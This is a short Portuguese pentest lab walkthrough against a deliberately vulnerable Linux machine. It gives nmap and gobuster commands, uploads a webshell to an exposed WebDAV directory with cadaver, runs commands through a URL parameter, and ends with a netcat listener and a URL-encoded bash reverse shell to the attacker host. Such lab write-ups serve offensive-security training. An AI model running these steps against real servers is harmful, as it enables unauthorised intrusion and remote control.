# ⚔️ Pentest Lab - WebDAV Exploração com Gobuster e Cadaver

> *Ambiente controlado para estudo de segurança ofensiva.*

## 🧠 Objetivo
Explorar um diretório WebDAV exposto via enumeração com `gobuster`, realizar upload de uma webshell com `cadaver` e executar comandos remotamente via navegador.

## 🖥️ Ambiente
- Atacante: Parrot OS (Linux)
- Alvo: Linux Exploitable 2 - IP `192.168.143.5`
- Rede: `192.168.143.0/24`

## 🔍 1. Descobrindo o alvo com `nmap`
```bash
nmap -sn 192.168.143.0/24
```

## 🚪 2. Enumerando portas
```bash
nmap -sS -p- -A 192.168.143.5
```

## 🗂️ 3. Força bruta de diretórios com `gobuster`
```bash
gobuster dir -u http://192.168.143.5 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 30
```

## 📂 4. Explorando o WebDAV com `cadaver`
```bash
cadaver http://192.168.143.5/dav/
put shell.php
```

## 💣 5. Executando comandos com a webshell
No navegador:
```
http://192.168.143.5/dav/shell.php?cmd=id
```

## 🔐 6. Shell reversa com Netcat
No Parrot:
```bash
nc -lvnp 4444
```
No navegador:
```
http://192.168.143.5/dav/shell.php?cmd=bash+-i+>%20/dev/tcp/192.168.143.6/4444+0>%261
```